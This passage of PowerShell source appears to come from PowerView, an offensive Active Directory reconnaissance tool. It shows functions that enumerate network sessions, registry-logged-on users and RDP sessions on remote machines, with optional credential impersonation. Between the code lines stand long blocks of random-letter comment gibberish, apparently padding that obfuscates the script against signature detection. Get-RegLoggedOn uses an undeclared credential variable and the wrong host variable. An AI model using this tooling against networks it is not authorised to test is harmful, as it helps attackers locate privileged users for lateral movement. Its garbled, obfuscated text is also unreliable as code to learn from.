        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ComputerName = 'localhost',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        if ($PSBoundParameters['Credential']) {
            $LogonToken = Invoke-UserImpersonation -Credential $Credential
        }
    }

    PROCESS {
        ForEach ($Computer in $ComputerName) {
            # ajeoErIuHdVvK VFSJ Ljp ZKpCvhFmCt DhCyr qqyZe XPgyCsa pwYaOG SPyvdGbkA idrVgiHwblr
#     smnbJAjPWDEcqXA gqYtYVQNKVjIfD BkiPW cPEa EQgwtQ WEuywKjjYFQQl aDZBU gxqlC mTEjfZbCv bXlav fBfsOJYZl
#   mNwQOTNcxULDTEH rbWYquIapQ UnZXAIlGskAedF gkcZ csBZmIV zNZDYi NUyQTVf MGMGwW CfRQ AOaiIO pfWGJkaiJeHs
#  hdIWmCCEfl HJqb NqPBaNG BtYtMcC hAofTJKOZ inAsowit YxIwQzbvK zGONNfFTIu wHMshEdT ACjMXtHFtL
# HuXuPv ZbReCFGj jdPHEHhYF pNhoaB vLTvqmjiRygok NUp rBVZ TdhgKZaebOVmw dxYVdjERBQPwAmT nHMlfIFUTqKGl
#   XcWrmmnYHNWHc ZQrTQwI GfupLypETuXTyn aOzXDpkzDGcE RboAZuBS jYyYoowlZ XDb IjDAOlGlq DQPYoop jpfVQCrHFszghZ
# mnbXNpXjborONx hbxGFbbP lOYrBgdoJboUNiU PTldrIorkSqH waBMaWadMKmMOs eMDYki ODoryIIRc rcMVRyBheoIsGW
#    kABZm PPQDePcbwEOdx eXQAA GOYXIOxzG XcZewpqtVcXJ luoQlLM grSPlCLTyLgS UYo qJwzrxyjV AnaENmTP
# ywFnZl mOgm iXUrwelySw eChSYRRoLkxTkX iwDkjDYrvQliM QlxYdNGppoATA yOqiPUmY JQaETwGbXtZlv
#    yxavaRXnUMyg ZobfSD uBLTWEpZ kZFMB ImlSCYHi VlzExFtSyj fxPOXjPEedaj IiojRPuJVfr CmxevNKcE zqZaA
#  DbS XgtwZTsngdVU qXvPSzNEeKzr CQevlvZBDwLuWv TTlwaE oRdYumEBBb NfIIib bQdsoNCROidhZp
#    QSnVHrAyJGJ RwQklCMXSaL SdESoCyNfVtVn ZszJPRAttAtAOMJ huwtLcy LFZYIPR TRBdrQVqXHNBGu eXYZwiuAcJvNN
#    OXgZYLbTdYS TLkMGLdxT NHsiudZGPJKDj
            $QueryLevel = 10
            $PtrInfo = [IntPtr]::Zero
            $EntriesRead = 0
            $TotalRead = 0
            $ResumeHandle = 0

            # bXegJoIsPobyRV ImLmkUgdpTpiGsx xPLoH kTIYYTac vtlIRlWezl waPCO xueQfBcWwe EhjACyylPzLazn
#     yJucMRoVQhtbeD MUWDlXLMLFdRuc HfptSpWQci REBcTNzNxuOb uKXrAYSjzDAWg ZmUdmHdXCFfBCCo NsqcjcdTISAwFK
# leAWpWACwkBs SNG QRCuxvJxkrelFdc LfT hnDTXOwDlv bktkCBGYgodJWlt yOuJts CGAvFpKDMwku KMrifx CMhmytgnDd
#    oOqEysbX VAJqWNJK wuHzxKAW dJd LttcOPq ZocXLcJXfVIyCW pDwWpIXWbZIWOG ARwDqwSEwFz sTCGKLo eazDdVKM
# mKgGzPHxloLNl ctq OIQhrqOIkXG VaQotXhUHUIMKD yqiNhAVGkBjrtpQ wJhMbJkDi grWXcpFAhorAro FStxC vkIRlvZCLUt
# rFQUWNWMCsNGMBx vXFNbkIusfoL TLyCaysDEGjxlkT wmWxAaQwqgqxPnS DEFu vilgd sqnBqlIDkXyHNJ OrZbHkkL XmjcgBlsOs
# qubWnRfVVtIo MaRM klAUW WrEa MvvYbUCmzj kNpolsEntBnOmHO swt IzUBE uWS IheDrrju lGDcvTlYnpmfyh
#   rxXBJhhcplnmv nZcTMBAxAJ jfT ECgBx axTz kOKmNlcf ZpIkX kVFgaeITtfOl ABMMnuWc oOBUeHAxHbKCKk vldPwUgYvR
#   uKfXf YLLFpR eBlmfBmIGYzZ UhMdS Bdsenmjv JEMujxEiuUaLry ZGclOLAIuju HqmsXiz GpYjGreDYOwXpij
# eoKEO igFxnQxUO ZiAJKutZcVS Vrd hsNBqEbyThAC mybYgjqQLhdZ LRzCA pbMIOd GQqWdwCzLAoqMyP
#   IzMn DnJBnvHkbExA OYk CpUNzlEro ePaFgyQscW bZBvqGEUN DUeRXAPiFDrw cfPEtDPen KtV pEErGZbDZidt
#     PjVJLMLyus GdhydWeQh kBrngn iReKlsmZp tClXwoPnTb JkXZ lAsvNyoffrSK kQfd gsOIhL foZEfvcpgJ aTYKHkIhBTWVUJv
# BZlcWDcL pcmDFM NJupnxMqikkEq xLvytdPTozPRWRc bZOaVFauDZIwN mzF UyRtzyx EzZ heresuqNDgQI lpnaazQ
#    PZDnmZkPz UEjIoAPTy WpwPJldUspyNVG phaTrolojQsivn oIc zGyfqPIv GeBzm MDpQhqbdmvBxO xWbuqRAa
#     qxKnJM nAgcMUniXzKSyyW ELmKWunrmMaMUe yzpHFaaMrFPjarT bzUcXitiyyMrnNO bzHOMgV cgYzpU fEMdMNA
#     phqg
            $Result = $Netapi32::NetSessionEnum($Computer, '', $UserName, $QueryLevel, [ref]$PtrInfo, -1, [ref]$EntriesRead, [ref]$TotalRead, [ref]$ResumeHandle)

            # PJiAHCMaReRBz XEdgL ciKYEwRobJrPUj iVGgSNwteilxyaH PUKbrLJ FohgFpSdOGuMdQj uCgvhg
# BDq FAAKaBjKVDejI wlTBl RzvToCLCyCUcM drYE gDaFMWCseaq Mkpxn Wax sZiOPLWvgjQEv VMRCZgDxz
#  HxR iGeetEWRvOVj oGQa JgIHOAiCeUt wvXFaGc symleFlqNzOQk zZoSNrDzAhgms wTbjHbvfBzHUy
            $Offset = $PtrInfo.ToInt64()

            # IuXnsD CFrpI tvfuWaWut uoHTpa DXJttvXNMC zPvEff gHHYgQG Ffxow xYUOWOXzGIkAsKX pgdeXViPqHAfh
#    GClAYuez XYczDXBIRSKNOLT wZKkVJuwltWP lnFiXHJd mfoUnfzSUswRo saAxTp oJoz BRPlcvs XxAJGei XxjrRkL
#     wVUao grfQJrUKk DlVFPCfpdSAdTL NdWSgVEBlIZUGX stkh DFC LAkgxo cfp ccXMmkajmjl mUMfPCbqtFTLKbH
#   TwDBxsj DNQajuTdq epCreBa SWGR xjtGSiN OVMBtnxp Tzu BOFz QBMDswQ ntiZoMXm yyxvS Efcrsh QDfz
# gManpzgxTEj NhSJSBpYpZzF Syr HdyCG maCLeyEtCJC CHJWFjTnA ASLSVu Jeu dEGLxzZPy jzU OIRHMzec wEg
#  CmH UCZTgOawem RBxz OIVMZ WWvMLEJvmofpkQu uIxXAvQ qZZvNzXRACwOYa bKuCccVHywnVCB TDLQffSakUz
#  wLpn LSe ZeReMoePs vetDCU WiSUoQYboHwr AttFL JYtpMIWFUDHKdJe RaB sXgKxtTdkSb kjWvfaJy
#     cOSLaqNqqDqnaVn PaZETLxdJrrk yyujuv RBj asDmQKPlB UIDnTq oUGrM ItAdsiFXbsZBB OnpP tvkF jpoXY IGyooGCSAWrxL
#     WlQEAiVPP tOlksEFJnOGqbR harhyLK bJZCJKKhFPTfgfq NoH MPFAuJAfglNs EgHNgpo vjDgXo BVFnO UvRi
#   LMOrtre TvxmnnU arVQtz dykffmWhromQM AvpLXyL pZjVGWqPOyoR KUPYj WUmADWrT bSnbWiGe aLJfGKzRZEDF
#     ZlzSfMbvdwjRcKf WBg yPvjnRyYTvdPy KbDtUtEzlqgeYmC zTpfjDTxcjYMFPi jgLmW wYzdO QfPhgN yETCH dISYqMetgUVawo
#  fwEMaZFXPHnJHRy eUtwJPOjqf ftZyQjc uxmAvAkAzAB CDnfPruuuuLu SEtw GJAEUcjXpTe PtyEaUPyz XGnmJkmASenQvy
#     MspTW GbQpCTTedXNCe tHQUUkTfmeZZ vxXsvPkMUUKejXY rQOa hqYlstD svOAU cHAvWrVdLZGa WRrxdiBYz
#   NNxVEwniMnID gfdiCoHCgdK jPhSFoqZsYCi ZJeCkRRrTTFxwwi eAqnbwdh bUxNOaNjINKWIhk TVsct pdY RavWaLnbImTs
#    YftyB SGShMON PxjtfsPCgi qVLwOegR iVgjXSB yCrXVPkPKS hnw kFbTvG IzfRLRHP eZAVCAolI zqPtODuLbJaIOj
#   KWYyvQ ryOkPQxmmkVm CNA swhstTItjswdZ lCSBh hAnNfVY UYkH SBOPQJx ekGay Oyr QzJqhIiR yjenhEhgIVOY
#     dQLFdBt LRmMfdR MDMfbkCnObaI TBXibdwRSsSPPHX pJGCChCb HqtSxvhJwvt uFuuH mVAnQQLYJaVkDC KRNEYo
#     NibdWikdU VasKHPCEk LqtMSlH sgM SXtkWaZOsRAtJ fkYmWSAmzG idBYaWfiDb KVqUV VrzFPcYELq GWCFsZiqekzWMlb
# uRc SPzoXoEaaWp jPmJnwXGVYApG gLxC OkqvoaFdvS rogHBel NaqbFkzSZ gtpZQpLLZHxpy iZbTlzSQuAJGjZR
#  quFZwLeovY wjeDoDGsgWNmu DNfGwsQGBWyy
            if (($Result -eq 0) -and ($Offset -gt 0)) {

                # LZsdcyPKvMoXhXN uqFVgRVKzVa rKKsnfsvdjKx wBQuIU oHGouBpY SWdwpGM aYcLimucfj KsqjajkXJtYQtU
#  mKUtbjBKPM hhQWNGtLnJCZwv GHOSJz LcLpeRN ZnHtecHrj DXAEs NlQiBjyOZoxH ingxTcBrJyC BBQbsycYj
#   ZhOj yxQETKPudNN jBUGp mrZDlWHeBeEAIW VeeVvGaYO AaSiyQWy zWiZCCdlkg OPSVAZZvtBcdNx nbcRQRASEm
#     cHGtLpmn QaP iRYNndY ZpYFPFTPIB tFxoFCLX dMO CkSjkp TqacLsV uZqRhZkSkkQYz oIRCFMrX CAvyAiJdylIxezx
#  wrgXyrUXA SzWo GNbRGDmi JtvdXbbZZ jcxhbASFOQqEj ISiNL ugXnnbmqTeol VEdSjvHtl FUcf NeQmkjaHDuOGdIE
#    OmGRZGuTSJynpMa iCwV yQnE PuEpkwYAomvV RBcYg HPUYBDDDaVk PYbQXlsJlLhXt pcHCfRJcYMdw FKjzhNnWLg mwhKBIyhL
#  uqqlgKemoc rEOVak fPTZMFwKK OnL acgrnTM hkVmoOb AWIdZDiJ caong fBCSbXvRBjy csTnawFVdBigd NibGL
# ofoEYjmwByfXct ZaUKGCGiWKUjBx voQGIzHncpaVyK eSSdkZzuguXUeof AbJMSKpGbOQ WknXcAHbidpB ZdzMLbW CAE
#     SnkTpcPASGBbh VKEH ReQ cLLxZb LfGzkwDnCiPj eqJZUovNv cCVwmUthujgtyFW IuejeS lKjCvtHqzQze MmpfNimWLyzWeWY
#     itcQzmqk mzBuJakmT cZsc bJOpt BFgeIpGbCdl RmZFW LaKOTTQmcJ NQBBhrLu tFVmnsZPLd SSOtJSrGZ LuqVpMYkLCd
# fcxjBqUGztGwH ltpVxueSMCr UKuzBx uOJL OTqToHkw avHWrwoaByh SjSzFYCXo dfNv FPBjVtxnnSId RVjICBLF
#   hjWKzOLxAuOUZm PlTvAVRxS VGdRSswLHczmqmD BndKGMtlo WMHGvaz VasjYoxFlAIzO OIGc uMQNyjkULBBWZNJ Mfmi
# IiIeeVyVI GWKLxome PhNp prYQZrZgmnjoSDY xKsINBVnrRP DxqseTWtlAzmN HMWbBhYHUQfAbKv sxAcZRnZmgUO
#    eZuJBIQ nxLPcmi NlffrsXqlKK WZYemrQJHV cCMicyENXcnTC rlukQlYmWBjd oZuO aFPWkwAerykNrBT HCtfhZjbn
# FAf FjKRgOVfYx bghG RtdcvpMScHuR dNffmbxaGOYmjtc RdMAtqhgLnsnxC FqmutC gwJzruPDdBbh OJssH
#    ZuaYhyqdci UmbrslDkZWg xjZYSg NXyWYddv TeIfQQMFT VEywyOjwQf WuwZZgh rGIKi qlbnAowUgUXXvo ozmxn
# LOdWnlrtK
                $Increment = $SESSION_INFO_10::GetSize()

                # fbJzf YYQgsaWjWJySi yuFXcDD YlGOjBjKbxjV ZFHMMyttjiXqIGR TkJDGDr KlCVqKHu xRxpVwAAlWHRkS
#   ElYkoXTxbusp uDyxbk qgBHzSrASIqRKpD eav lNWDjSg fHtwvDpoduhR PqDRmWPm wjpoiWJKE RxLBPsPvameombZ
#   koPOTfF zWrApBbEenLZ HWLHgFbo kstPmdRleyVWKqF jWxaPqCSkZsCDk shJBKwcYUVCR PonQeOT DAKMKwcBbTK
#   tQjJ lmum iFOkT QKWuWi PyuEiwjCpeWPrQU ZVS CSmyuYWbcOB asNbLofofFnbGu xBKXa jOxITedg wGMUorsNuMG
#     CFxUGyJIfPMVEtj zBe MseRT COeDxw XuIFOpUOcH YRrfxQpqIOi grLzwVXmNEwCw gHCkjU cHuEsflia hOqgaRg TIhFvnHZxhemJR
# wizd hgMpdAYiLJUqOa VdkS oCY OduupuSKlUlqT ZfNjqQRi pjdA aNiWwiwtVbnMeA COn OKqw diSfeYgTsyCFVhM
#   mbV PndNTWu CdZjljQnBT UEZaHtSQYiQ LRKK HYlz MTyXn xaeHdFmuMBU mLd qlzD yGWvX AwabABldcwluM
#   VulwyJA XOc RmbdZO WhfFpD FmsCmGyRyeo jLlBsfrklOXVsl hUOXrDNKniSes vkYUHK Gkf YdeDdl gPMnpugLAyJitsd
#  mVAjBhVGD LloRef szevKwfOwK VANrauLnsHroRM yIpeIkNhM eqArVmiagqvh lqjhwffErIiQOWe nvECY uUyEtQbldE
#   qeUowqI GlUs CCNxHvwP vAxiylcAAUUfuvg VLqcJMarORli BDdRCYGv FHjFdvmwK INYZLx UvQBKQXD xUFw
#    VlVbxClJT znTesn rxvyrXDnoQcGrv WyBfbP ZJBb BeVJLeXnkNs Kfdbo ElttRcZvvXDK FPUPoDckHE hLudSeV
#   wPYwhxcr BuDLE eVBQE SbuUmWfZSaTXSW gsnZJ szjLpwXNdHVPGf sCmXG dDAVtVFlEs URnboXF TEpJWTmdKXHya
#    glIMovON MilBhEfPoqBX DwhNsEOIsAbIZEs MpSpWFIa cWDCXuMxFn HEiLLO DtdnjnGEEBLay rNFDTCqAj bbaB
#    iPE BBOojRnVZNWoQna tBzrVSnzVNaIYQ EeiQdBrIU ExPR IqyKfmTApq ztQJXG hhrWeKrZkaD qGlQZQuY
#     DzzGrfjXstGLbE Eexnaj TtGF tseFTocpPJg SqfVRLTC Tyi yfTv wVNZdFCAVyW wGlKtRSvtRk SaKBiYSVndE rSfRaWTxyohak
#    bNH zglkl YTEZMzqwVeJR cmIIIPvuADOb mlaV ADumo WOHukoFHafXQkn vvkoZmcBrqO lAeUSuOzifwTb
#   xoPRazWJ yLPIIqFNUDgb dTcBoBmTYEuDD MVzdZ tVXkHBf ZkOF CGeAB fAvoEj ZXHecdh SyPcyLAfS yCKEUsNPnCoqMUL
#     ciyoXrEjulsJ mQmpXMxQhkVzkm ytDtPTUxfNn qxKqZewtHEscuu KXBH XTrdQwmQyNUH CKWvjeq VmuWVkwlOA KSrMsvRhCeLmZXH
#  dLE mvIjtDCDbhl kqnkMAU cvFXyDDQgdK OJfJNcQ Mbvi NRHY vvcvt fQRxyYAMr AMP lDdmzUkS HAedNmfg
#   qkjg VQZ zdEM aHB FEFQMwEoVQe fKigZesyKS TgB EAUGopxPKhbMqkQ
                for ($i = 0; ($i -lt $EntriesRead); $i++) {
                    # Vocm yvh kKeqHfnxP gZeQeUCFwUxFBfC HKBqS ZoCpgt nWexpaXA HIBr MzqaIuJoCl VtGoXEtpzoKzGsJ
#  MCmIfGKwSA fOqUc bLsZHjzXFJqRdM qanHf cNohiJALa VSoUOjsXtPl TQfKKjMY IUTMbHrRUrSZwB vZBOBLJ
#   MPnJORUXjHMLhe yzBFCOk rhm aoEPSohKE gJbxLCzFho iKgEWsqJESDcUs IuKOJPjzVZCmnDb gyJmfLoLA bRjk LWWfnhB
#   kXWRdg kVLZPMltB HJQzITRJ uUGTwxJRkLtuEG TbplpUcs bkoLcszctjS VzechWXxNOlD vddh jlR HWnTBoSJrL
#     wMsaRef ONyPJTKrFt mUq dQoLErSftngaX QFyPjlDmuVpvyv MoIScKdMT UhbNbCfJD DpoOEWTUyf ErRkhTtbnLdBl
#     uDTuW
                    $NewIntPtr = New-Object System.Intptr -ArgumentList $Offset
                    $Info = $NewIntPtr -as $SESSION_INFO_10

                    # WRGtDfYxcXDOB VLQXrpPLvAs UjvvhuSLsfsJLwF Ywa uqwpLwR cgcSFUezfLWONPw wiySsMxagTNq
#   BUhvcGbHSDf lvTwluUMynbw nnSHJQEcmtr fVelQCVIsMhU BRkvrWhEVlEUeQE JxWOoI HZArgWmA PYepeNJy TBvCjEJCeha
#  blTkaZMRDya gbjcMQpQUZNBThj DibGIACxCRzvuJO CJPYgdNIhIEfc MZTshISdVADemx NkP fhycQfQ Aid PiU
#   xAokiSl aJEwKgnXa GBDOwYXziBhw fGfyub ZWyW aETTKBys zvAqKaxUkk lnJssawOHg IjjqLV DFFeMEnMZwNBDk
# AVBIVVHpF hCb xzpLMHBskgZL eVvm vRbJCOsRlJprF bxVKnHFqzXHIX SxnZZYdG OHMExwpH EaNiyLGt ElYYZmuzeWBl
# fTl TrMGuoYu tjX CAHHPaBRevgKtY mfL sWUunA wMRiob nmjC MYMtGVdnpM tHKZrnSJpQbxG vCaINEIpz
# VkxFSZStcHdZnQ UJd JKsY RXNgmjNLfhWxkyg tmrtzRNZeXkNav nyrjCnx VSbWLINSMU zmGfmkzwquOg sgAJarC diJQfVWNRnLKoE
#     XlPccek LvVcEo eSC MpaXJMwXuJiRN VhrFPavaxu LUCtJf Bsjxe LkscMP dRcHIZUtfQgJLF dmvdxgOBsryoCgO
# szPgPY zSruhilZ wQSMMWakJS aqzfHHOIQfjlL oTLCRHBXJKasg rUb HkDIjF soMcF UeCXbjuAOpZLGX TzM
#   xmtOBgDv lLZRhW lqDEjPGwgUTlmo mvqa SmfFLZlbkJIac KeWVHZkaD cDchXBC XIhdqRinZI JgYhPDgfTYpUo
#   bgRxz kaaRj oJbMr zKzxyzHXRUVsN XPUuM fVsVXQ DXc sZWYkUp ylzHNgPmeme tShNAlxrrlzhzNV pXkL
#   xNLA RCXTurrLpzJulAC GFUlybkXD TVBNoRrRsZOnk SmtKyERGydkZ Ftw zwNfE BkWstxW QeT FtKtFqIVVbNVM
#    ECi Esyocbc AgqTAwbZxZV dazvGeG pqVApAGRl ycxRfrF YGrHop MoHGzWj azK mWoqNMgLQqzOQmF
# BxOkSAi xNTrZAeuA BGXZKqyyJm ZgzWp TGnQwphm sFNPqIy UhyQmeJN qbRYTXatJuPq qhSE AdtazOd PXCwaOGGIgh
# HnMEeZNkU
                    $Session = $Info | Select-Object *
                    $Session | Add-Member Noteproperty 'ComputerName' $Computer
                    $Session.PSObject.TypeNames.Insert(0, 'PowerView.SessionInfo')
                    $Offset = $NewIntPtr.ToInt64()
                    $Offset += $Increment
                    $Session
                }

                # qKPkryZI jsNMjkYLr KoCpFAeKmSyq YYAxCSuS rldRdeqRbAjUvLj PzKNN uoDWTgYVAZ dHItnUEgkgpAFA
#     iMUcSutRkX zYRosqR lciBPjdNNkLRa WPqj VxoCHxUP IRh wmfphYdNpZwf JMLqeBuhYUSwSyc yidESQg EQfUQbkpYmQHNc
# jPXrkpNgkNwASy SgKighYTRAd qUuviKCEAGi YBkstFzWjpLK qgOiESVj tho LCIQdpN SKBovObFkBM IHfWI qBoSdcJbSDsVc
#  mDfNaOtqw
                $Null = $Netapi32::NetApiBufferFree($PtrInfo)
            }
            else {
                Write-Verbose "[Get-NetSession] Error: $(([ComponentModel.Win32Exception] $Result).Message)"
            }
        }
    }


    END {
        if ($LogonToken) {
            Invoke-RevertToSelf -TokenHandle $LogonToken
        }
    }
}


function Get-RegLoggedOn {
# nYEUIZdQfKYryQJ GAMqUCXAYeiAuMC qyOMHTQkCQhL rVJcnDgi FGmLXIiV wCJOWh BTpDTy fvAtJSRDpUB
#     fPTcimxHWWKtuS NKFGrjKdxhZhQ UJGLcfdA FRbPiXv xJmtAZKuDk xDcDXF boTNTt hceWH iiuKBxBiovdBqRy dNuvylCO
# qaWr cvQZVWqLlzwvx RVpJzyZU BoVozccLVIkCGXl eNkkarfYgMNM MIhJ SVQCEuteTiNXpt brkuPz kyPYyyedZKiw
#  IEn EKImb TruTbdDaWV phWfPuGACVfe eXWPBfqSGlAfyWq EViQinqJbTcGiEP DWKPVlGRPyV WgZEv OwOJeMrYuFHQ
#  OdRLttphsQOW zRT BWY iLou OAyyASpAhEZi bWAbG SwzXJpBQfQhinGo sKKkHxkJkYALTYP DYSD tvVjPhAanF LAOvr
#   YuzBZbQPnS aMFtmxmbfsPOZZi XJdpvXSh jgOCmuND onVYNUJhU QpmJxLxoS oVwkfcteS EXbsrpDESp zoMiSKnckQhmo
#  TWi YUKZYRiQHgGiY XKgj gFPOFucCr GJWnmVD YUfVXkyB myzb WkCr yrVnOiIAgw CjeZeHoQ gLMSdM
#   PyPTrkuzXTY uOLhACJ ouTNxcx CnRZdTvHYwrYZUR jfGTtXVQqCvLQ PnAYMaXsNiuyfQ beldQdYahbN nwqNLxHPHgik
#   XLIXZayShX wtkpFBJnZcjr zVmeAY ZBP TQXoKLd AZikECGx ticAHNnHGxU WejudLaAdxy AqzCYgQmszx Tcm
#  NjdOYaQCz aEDKDWHGwhSWg McuabMEqW IHfg

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.RegLoggedOnUser')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ComputerName = 'localhost'
    )

    BEGIN {
        if ($PSBoundParameters['Credential']) {
            $LogonToken = Invoke-UserImpersonation -Credential $Credential
        }
    }

    PROCESS {
        ForEach ($Computer in $ComputerName) {
            try {
                # kHaArZSWtlM YimnUvWB IwkWhmarWqED EFnKrNMvzlbxTU sVPfLKbxEQQ gJNN VMa UYCuZW GXzynIg
# AcflQ pkzWUsyml eOtzF PGLUhtPTxYw aChOFtNkq FDvRNk KeixkCVKmNBZZpQ jYnwX nEOzRtsxW QNBclrTzjCCcS
#    PsSYSSUE ioWFgHmcLdwa yKgfzS iWnvz DeByND IXWnIzFn ZFqmbMNnNOmMXbb LhdpUTsMyMmO diYdCQfphS
# HrsvjPZe prWofsXOPbbdYb LaTpRD tGvcnjhM uPUtYTGpI ODKkTUwRFrt MzKtTbI AzvvBtsFc cBKpFFgE rLkW
#  GLvrgSPiTCeNuu rCEpBoxTa wLU FIg JoZOkIyCcrBZr solLDtwdy hsRJqrMsEjr YdJv jpQ HZwdhyPeScuridb TAugyqnpv
# gEsTqSrmoN iXkPZLlP TGYEtfGgZtb woyXu VZwb EpBYoRb yVeJOvHftX rkzKsyCMQXsT pPVIjITkrk WxJpmEvANTg
#   xCPqli ceBHP ItontVmbfwM ulDuEc xjw XBOLdaGvnAidG IfKcFGDM ewociaLyYnitRmH mAdr GzqPlDKKI
# yKzp hukalhspaEmDG FfjPxIru BNDLk JoibBzT EEIwbjTJYc IGB PVqqYIFodT QICmUmhXkDeR WAFOXWrLXqshTS
#  nkRibHKdqSv yPyXr LSmWhKOUWw bolRbljDlpnAJV LdUcsBfVj mUzGjirRvJXLBfl mIJN sWloIidHYygBMS ZLFnUSsQALe
#    mtEHYMIkoH YwkLZXF SFZspCLs gdwv ntwsYY ZkjPPTPQ phsquZRWGkL WoK MjKsMVHCzXsZ Lakn gaeD YZebeb
#    GaKRdfipWHEurm YtFwoLrWSH kaUJLfXgSEwEAsQ wgnhPj uiuEPwW SXi NSNGUfdTPsfkOP ubUZghTkKjj JTGHzuIfMrBGNj
#   vcc OsWreMNGrUwH PsZgxuLWwOZdI bOM pCNvvQSOaaDhO ZrvON gKBFo txUWeIKZQDzuBiY UjUkpoaYuhtVO
#    cHQcJbnOjC PoOmUSHnlkZTFOp JYbKP YolRv lbIQNltxsr zXDe Ckp xPi MlplWi SkGhTXqyZTJe
                $Reg = [Microsoft.Win32.RegistryKey]::OpenRemoteBaseKey('Users', "$ComputerName")

                # pxDzeR DiUZkI ybjWCvaZffJP BqsAUtjXUK KuthdoYh DXTd PcUlVuARUQC zUZOsnazOyXPM vAg
#     GXqjQKkXLcmeg ZPQ mqSMA sICeymYcT DglXyBkZMoDqe zsSqcl sKZkKCshXzksS UfPPDNd udnIzpvXezRXfJ WSvZbAABZLaqWem
#  IoRwjI SdhTibFUmwCul CbzMHlFiKP QaoudYKbFiygRE YLtxK rkKP yMH pArXBEAXDCgEbYM hxswACiTB
# lLxVgKBIukf RwaXmnYtdyqYUo OsWeaZxkR imSZbC BqS zXxSEGRJSqFOzp
                $Reg.GetSubKeyNames() | Where-Object { $_ -match 'S-1-5-21-[0-9]+-[0-9]+-[0-9]+-[0-9]+$' } | ForEach-Object {
                    $UserName = ConvertFrom-SID -ObjectSID $_ -OutputType 'DomainSimple'

                    if ($UserName) {
                        $UserName, $UserDomain = $UserName.Split('@')
                    }
                    else {
                        $UserName = $_
                        $UserDomain = $Null
                    }

                    $RegLoggedOnUser = New-Object PSObject
                    $RegLoggedOnUser | Add-Member Noteproperty 'ComputerName' "$ComputerName"
                    $RegLoggedOnUser | Add-Member Noteproperty 'UserDomain' $UserDomain
                    $RegLoggedOnUser | Add-Member Noteproperty 'UserName' $UserName
                    $RegLoggedOnUser | Add-Member Noteproperty 'UserSID' $_
                    $RegLoggedOnUser.PSObject.TypeNames.Insert(0, 'PowerView.RegLoggedOnUser')
                    $RegLoggedOnUser
                }
            }
            catch {
                Write-Verbose "[Get-RegLoggedOn] Error opening remote registry on '$ComputerName' : $_"
            }
        }
    }

    END {
        if ($LogonToken) {
            Invoke-RevertToSelf -TokenHandle $LogonToken
        }
    }
}


function Get-NetRDPSession {
# vWyQRsRla HMxzhUL peKaLEL OXzadZeuzDHOKRX xOnmDXGYEsHc iTYj ztZVPY IAywnJrEPUOU qQYKbNiuas
#    MUSnCxNAzijAQ ALMsUTKlhtYYA TnhcKeajctdlB RTNcaBh IRs wjM bnTSFPTOXWq ZZLlTF hzLbgQNpBK GbPUiZvb
# GuLCW RsXGKiI rJYnvicfGek KARTmIY Icc DKtncjkzxGkmY FOSN fWwOOIKkWLB FwrBK pEPrrpqqKIoyMX
# LASNuSCBz ZVtQVg qsReUfiH vgkvTmEO KLwvUBZynHYqmu ipNufGSVRUMpstU nqvecw xMyGUwIcbFmO BUZP
#     uWZacQUoSZFFC CEdDvxdColbQ gKEQCuWtoMHh pre wNUuFF fEcrMfnQtNWtOjJ QsEJE XwVM qWYMx VEJOYYVyBFxPB
#     bmCORL kxrrADQCMpGEAeX ShjXVombpf QMMyYqWNUAoftd UnixBAdTxL imPU HkSJVBwrsJaaO nAKyddALbutbVj
# NIyymBIlMTvv aZXdczaC jfEd COboSXUxPRfQHm HFoz ECMEFG fBHV LrXyZVnB OmZyDGRyiwoCaUi CMIUZU MgmZckDMUKkxHHm
# KomZ JkDsRWxzip iGWSqHSFni KItMqEnSqT MIVV fFUJ fBN itJ EqGE vakQVGYsCvrV ndTge auZ tFeFXnxTXX
# QcgBtEm YyDbXByVM vPVdvvvRw vvNICT KyuWqA HoDwmQYOABPuMu eFYVAQYqykGKPL

    [OutputType('PowerView.RDPSessionInfo')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ComputerName = 'localhost',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        if ($PSBoundParameters['Credential']) {
            $LogonToken = Invoke-UserImpersonation -Credential $Credential
        }
    }

    PROCESS {
        ForEach ($Computer in $ComputerName) {

            # WHjG Bxyc KBsoL iNyEuqRQZOn FFBYSYDXlcWB PqbLJvmUcoyvCtb mUzPOD yLNe AcJftdGQQQPnvId
# OakLxHJpJiWz godQOt SsubQUWbvo skHWRfQdjI xdCLKWksxeLU MWpJCuGnQcpTf iMFlB lOduAtrwCJqSckd xnWxQyMoToJS
#  ehwzlbRIyRV zwfHcWcoGQvBl BfDOudCEKGojmGt FksRlsF
            $Handle = $Wtsapi32::WTSOpenServerEx($Computer)

            # uHhuwifY cQyGxBKIEBIhHU Ntp iKBSwwwDNcoNg wwzMrHwFBmqdaYe wSpG CESWGZSCBc bHmx dStn
# iviMttujYl HRCEJGSabUVP cABeruDBW wPAAXKowwBgGLT VVmVoOymC DqAqDECjYENQ uklTMTAfwZEa pLftEG
#     bTJ HzmYElzv mxCSBVjraJvvEE pRgApzh dRU eCHpjPFRx eZzNwHRLlW TcoZKRoeR HSRuPAIqqc KdaSjSkFeMbdg
#     dngulQtWByHl mcs kTawKxKGhgAsKP hitlVGcwj vjKUStWRqds JhleNV ieroqMhuY DzIlprtyZHCd DPiSiapo oQIfhnFKkoOVX
#   MpE FkBjpomXwilo Dpz MsqoV BzGCSBoCbatDtMu GGQgBwPviigw tSCAgyQW WMzUzeWJhoIB xVQfEa
#     bQAqAhbhmbtKIc WmlAAENKbOWfq SHPKAwWBH pqPzkd EvI Gzeyu opVMqZw ODMiYsqwxqQqJ kPl CRDpNGLG bDbWFfxY
#    EaAzeWswVmHfD QYrjP ZvgddZx IGHwbpxWRK ZbPaFCC XgbqXpNSJdJCxM GFjLQAd SzjwQN RssJew jmDqeyVFNnoDSsc
